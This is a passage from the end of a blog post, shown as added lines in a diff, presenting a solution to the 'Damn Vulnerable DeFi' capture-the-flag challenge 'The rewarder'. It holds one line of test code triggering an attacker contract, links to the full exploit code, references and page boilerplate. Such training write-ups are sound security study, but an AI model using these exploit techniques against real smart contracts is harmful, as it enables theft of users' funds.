+</span></span><span style="display:flex;"><span>        <span style="color:#000">await</span> <span style="color:#000">attack</span>.<span style="color:#000">connect</span>(<span style="color:#000">attacker</span>).<span style="color:#000">run</span>(<span style="color:#000">attacker</span>.<span style="color:#00f">address</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    });</span></span></code></pre></td></tr></table>
+</div>
+</div>
+<p>You can find the complete code <a href="https://github.com/dellalibera/damn-vulnerable-defi-solutions/blob/master/test/the-rewarder/the-rewarder.challenge.js" target="_blank" rel="noopener noreffer ">here</a> and <a href="https://github.com/dellalibera/damn-vulnerable-defi-solutions/blob/master/contracts/attacker-contracts/AttackRewarder.sol" target="_blank" rel="noopener noreffer ">here</a>.</p>
+<h2 id="4-references">4) References</h2>
+<ul>
+<li><a href="https://docs.openzeppelin.com/contracts/3.x/api/token/erc20#ERC20Snapshot" target="_blank" rel="noopener noreffer ">ERC20Snapshot</a></li>
+<li><a href="https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard" target="_blank" rel="noopener noreffer ">ReentrancyGuard</a></li>
+</ul></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on August 11, 2022</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://dellalibera.github.io/posts/damnvulnerabledefi_05_the-rewarder/" data-title="Damn Vulnerable DeFi - Challenge #5 - The rewarder" data-via="_d3lla_" data-hashtags="Damn Vulnerable DeFi,CTF,Solidity,Blockchain"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://dellalibera.github.io/posts/damnvulnerabledefi_05_the-rewarder/" data-hashtag="Damn Vulnerable DeFi"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://dellalibera.github.io/posts/damnvulnerabledefi_05_the-rewarder/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/damn-vulnerable-defi/">Damn Vulnerable DeFi</a>,&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/solidity/">Solidity</a>,&nbsp;<a href="/tags/blockchain/">Blockchain</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+            <a href="/posts/damnvulnerabledefi_01_unstoppable/" class="next" rel="next" title="Damn Vulnerable DeFi - Challenge #1 - Unstoppable">Damn Vulnerable DeFi - Challenge #1 - Unstoppable<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://dellalibera.github.io/about/" target="_blank">della</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/css/e2eb86.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
